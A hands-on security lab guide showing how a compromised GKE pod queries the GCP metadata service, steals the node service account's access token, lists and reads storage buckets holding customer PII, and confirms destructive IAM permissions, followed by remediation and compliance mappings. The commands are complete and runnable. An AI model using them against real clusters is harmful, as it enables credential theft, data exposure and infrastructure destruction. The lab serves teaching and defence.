# Lab 04: Cloud Privilege Escalation
> **Layer**: Cloud | **Difficulty**: Intermediate | **Duration**: 40 min

## Objective

Demonstrate how a compromised container on GKE can escalate privileges to the cloud layer by querying the GCP instance metadata service. Participants will extract the node's service account access token and use it to enumerate and access GCP resources -- including listing GCS buckets, reading sensitive data, and discovering the overly broad IAM permissions assigned to the GKE node service account.

## OWASP Mapping

- **A01:2021 -- Broken Access Control**: Node service account with roles/editor grants excessive cloud permissions
- **A05:2021 -- Security Misconfiguration**: Legacy metadata endpoint enabled, no Workload Identity, public GCS bucket
- **A02:2021 -- Cryptographic Failures**: GCS bucket without CMEK encryption, public access enabled

## GCC Compliance Impact

| Framework | Control | Description |
|-----------|---------|-------------|
| NIST 800-53 | AC-6 | Least Privilege -- node SA should not have roles/editor |
| NIST 800-53 | SC-28 | Protection of Information at Rest -- CMEK encryption required |
| CIS GCP | 1.4 | Ensure that ServiceAccount has no Admin privileges |
| CIS GCP | 5.1 | Ensure that Cloud Storage bucket is not anonymously or publicly accessible |
| CIS GCP | 6.3.1 | Ensure legacy Compute Engine instance metadata APIs are disabled |
| ISO 27001 | A.9.2.3 | Management of privileged access rights |
| PCI DSS | 7.2 | Establish an access control system for systems components |

## Prerequisites

- Shell access to the vulnerable pod (from Lab 02) or the ability to exec into it
- `curl` available inside the container
- Basic understanding of GCP IAM, metadata service, and GCS
- The GKE node service account has `roles/editor`, `roles/storage.admin`, and `roles/aiplatform.admin`

## Attack Steps

### Step 1: Query the GCP Instance Metadata Service

From inside the compromised pod, access the GCP metadata service to confirm reachability and enumerate available metadata categories.

```bash
kubectl exec -it deploy/vuln-app -n ai-governance -- /bin/bash -c '
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/
'
```

**Expected Output:**
```text
attributes/
cpu-platform
description
disks/
guest-attributes/
hostname
id
image
licenses/
machine-type
maintenance-event
name
network-interfaces/
preempted
remaining-cpu-time
scheduling/
service-accounts/
tags
zone
```

**Explanation:**
The GCP metadata service at `169.254.169.254` is accessible from any process running on a GCE instance, including containers on GKE nodes. With legacy metadata endpoints enabled, the only requirement is the `Metadata-Flavor: Google` header. This directory listing reveals that service account credentials, network configuration, and instance attributes are all queryable, providing a roadmap for the subsequent escalation steps.

---

### Step 2: Retrieve Instance Identity Information

Extract the instance hostname and zone to identify the specific GKE node and project.

```bash
kubectl exec -it deploy/vuln-app -n ai-governance -- /bin/bash -c '
echo "=== Hostname ==="
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/hostname
echo ""
echo "=== Zone ==="
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/zone
echo ""
echo "=== Project ID ==="
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/project/project-id
'
```

**Expected Output:**
```text
=== Hostname ===
gke-vuln-cluster-default-pool-xxxxxx.c.PROJECT_ID.internal
=== Zone ===
projects/PROJECT_NUMBER/zones/us-central1-a
=== Project ID ===
PROJECT_ID
```

**Explanation:**
The hostname reveals the GKE cluster name and node pool. The zone and project ID are essential for constructing GCP API calls in later steps. This information is freely available to any workload running on the node and cannot be restricted through Kubernetes RBAC -- it requires metadata service restrictions at the GCP layer.

---

### Step 3: List Available Service Accounts

Discover which GCP service accounts are attached to the GKE node and available for token generation.

```bash
kubectl exec -it deploy/vuln-app -n ai-governance -- /bin/bash -c '
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/
'
```

**Expected Output:**
```text
default/
PROJECT_NUMBER-compute@developer.gserviceaccount.com/
```

**Explanation:**
The metadata service lists all service accounts attached to the instance. In this case, the default Compute Engine service account is available. On GKE, all pods on a node share this node-level service account unless Workload Identity is configured to map Kubernetes service accounts to dedicated GCP service accounts. This means any compromised pod inherits the full IAM permissions of the node.

---

### Step 4: Extract an Access Token

Retrieve a live OAuth2 access token for the node's service account that can be used to authenticate to any GCP API.

```bash
kubectl exec -it deploy/vuln-app -n ai-governance -- /bin/bash -c '
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
'
```

**Expected Output:**
```text
{
  "access_token": "ya29.c.b0AXv0zTP...<long token>",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

**Explanation:**
This is the most critical step in the cloud escalation chain. The metadata service returns a live access token that can be used in the `Authorization: Bearer` header to call any GCP API. The token inherits all IAM roles assigned to the node service account, which in this environment includes `roles/editor`, `roles/storage.admin`, and `roles/aiplatform.admin`. The token is valid for one hour and automatically refreshable from the metadata endpoint.

---

### Step 5: List GCS Buckets Using the Stolen Token

Use the extracted access token to enumerate all Cloud Storage buckets in the project.

```bash
kubectl exec -it deploy/vuln-app -n ai-governance -- /bin/bash -c '
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token \
  | grep -o "\"access_token\":\"[^\"]*\"" | cut -d\" -f4)

PROJECT_ID=$(curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/project/project-id)

curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=$PROJECT_ID" \
  | grep "\"name\":"
'
```

**Expected Output:**
```text
    "name": "vuln-ai-governance-data-PROJECT_ID",
    "name": "PROJECT_ID-terraform-state",
    "name": "PROJECT_ID-gcf-source",
```

**Explanation:**
With `roles/storage.admin`, the stolen token can list all buckets in the project and read, write, or delete any object. The `vuln-ai-governance-data-PROJECT_ID` bucket is the primary target, but the presence of a Terraform state bucket is also significant -- Terraform state files often contain secrets, database passwords, and infrastructure details in plaintext.

---

### Step 6: Read Sensitive Data from the Bucket

Access objects inside the identified bucket to extract PII or other sensitive data.

```bash
kubectl exec -it deploy/vuln-app -n ai-governance -- /bin/bash -c '
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token \
  | grep -o "\"access_token\":\"[^\"]*\"" | cut -d\" -f4)

PROJECT_ID=$(curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/project/project-id)

echo "=== Listing Objects ==="
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/vuln-ai-governance-data-$PROJECT_ID/o" \
  | grep "\"name\":"

echo ""
echo "=== Reading Sample File ==="
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/vuln-ai-governance-data-$PROJECT_ID/o/customer_data.csv?alt=media" \
  | head -5
'
```

**Expected Output:**
```text
=== Listing Objects ===
    "name": "customer_data.csv",
    "name": "financial_reports/q4_2025.xlsx",
    "name": "models/risk_assessment_v2.pkl",

=== Reading Sample File ===
customer_id,name,email,national_id,risk_score
1001,Ahmed Al-Farsi,ahmed@example.com,784-XXXX-XXXXXXX-X,72
1002,Fatima Hassan,fatima@example.com,784-XXXX-XXXXXXX-X,85
1003,Omar Khalil,omar@example.com,784-XXXX-XXXXXXX-X,91
1004,Sara Al-Mansoori,sara@example.com,784-XXXX-XXXXXXX-X,65
```

**Explanation:**
The bucket contains customer PII including names, email addresses, national IDs, and risk scores. Because the bucket is configured with public access and no CMEK encryption, this data has multiple exposure vectors: the stolen token, direct public URL access, and no encryption key management. The combination of `roles/storage.admin` on the node SA and a misconfigured bucket makes this data freely accessible to any compromised workload.

---

### Step 7: Check IAM Permissions of the Stolen Token

Query the IAM API to understand the full scope of what the stolen token can do across the project.

```bash
kubectl exec -it deploy/vuln-app -n ai-governance -- /bin/bash -c '
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token \
  | grep -o "\"access_token\":\"[^\"]*\"" | cut -d\" -f4)

PROJECT_ID=$(curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/project/project-id)

curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"permissions\": [
      \"compute.instances.list\",
      \"storage.buckets.delete\",
      \"iam.serviceAccounts.create\",
      \"container.clusters.delete\",
      \"aiplatform.models.list\",
      \"aiplatform.endpoints.deploy\"
    ]
  }" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID:testIamPermissions"
'
```

**Expected Output:**
```text
{
  "permissions": [
    "compute.instances.list",
    "storage.buckets.delete",
    "iam.serviceAccounts.create",
    "container.clusters.delete",
    "aiplatform.models.list",
    "aiplatform.endpoints.deploy"
  ]
}
```

**Explanation:**
The `testIamPermissions` API confirms that the stolen token holds every tested permission, including destructive ones like `storage.buckets.delete` and `container.clusters.delete`, as well as IAM manipulation via `iam.serviceAccounts.create`. The `roles/editor` role alone grants write access to nearly all GCP resources, and combined with `roles/storage.admin` and `roles/aiplatform.admin`, this token can exfiltrate data, deploy malicious AI models, create persistent backdoor service accounts, or destroy infrastructure.

## Remediation

1. **Enable Workload Identity**: Configure GKE Workload Identity to map Kubernetes service accounts to dedicated GCP service accounts with minimal permissions. This eliminates the need for pods to access the node's metadata service.
2. **Least-Privilege IAM**: Replace `roles/editor` with specific, narrowly scoped roles. A web application typically needs no GCP IAM permissions at all. If cloud resource access is required, grant only the specific permissions needed.
3. **CMEK Encryption**: Enable Customer-Managed Encryption Keys on all GCS buckets containing sensitive data. This provides an additional layer of access control through KMS key permissions.
4. **Block Public Access**: Enable the Organization Policy constraint `constraints/storage.publicAccessPrevention` or set `publicAccessPrevention: enforced` on individual buckets to prevent accidental or intentional public exposure.
5. **Disable Legacy Metadata Endpoints**: Ensure GKE node pools are configured with `--metadata disable-legacy-endpoints=true` to require the `Metadata-Flavor: Google` header and prevent simple SSRF-based metadata access.
6. **Metadata Concealment**: Use GKE metadata concealment or Workload Identity to prevent pods from accessing the node's metadata service entirely.

## Key Takeaways

- The GCP metadata service is the bridge between container compromise and cloud-level access. Any pod on a GKE node can reach it by default.
- Node-level service accounts are shared across all pods on the node. A single compromised workload inherits the IAM permissions intended for the entire node.
- `roles/editor` is nearly equivalent to project owner for practical attack purposes and should never be assigned to GKE node service accounts.
- Cloud security controls (Workload Identity, CMEK, public access prevention) must be layered on top of Kubernetes security to prevent container-to-cloud escalation.
